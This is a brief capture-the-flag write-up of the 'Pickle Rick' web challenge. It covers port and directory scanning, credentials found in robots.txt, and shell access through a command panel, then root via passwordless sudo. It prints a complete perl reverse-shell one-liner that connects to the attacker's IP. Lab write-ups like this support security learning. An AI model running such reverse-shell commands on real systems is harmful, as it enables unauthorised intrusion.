# Pickle-Rick.

> This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

IP : `10.10.71.65`.

nmap scan [results](/nmap).

Open ports : `20:ssh`, 	`80:http`.

Username found : `R1ckRul3s`. (Requires public key to login via `ssh`, can't use hydra).

nitko scan [result](/nikto).

Gobuster [result](/gobuster).

Found directories through Gobuster : 
```
/.hta 
/.htaccess 
/.htpasswd 
/assets 
/index.html 
/robots.txt 
/server-status 
/login.php 
```
`/robots.txt` had a string : `Wubbalubbadubdub`.

This turned out to be the password for the username found!

Got a command panel in `portal.php`.

To get a reverse shell we use a perl command : 
```
perl -e 'use Socket;$i="<your ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Got shell access!

Found answers to Q1, Q2 can be found in `/home/rick`.

`sudo -l` gave us `(ALL) NOPASSWD: ALL` result, could log in as root without password.

got the 3rd ingredient!
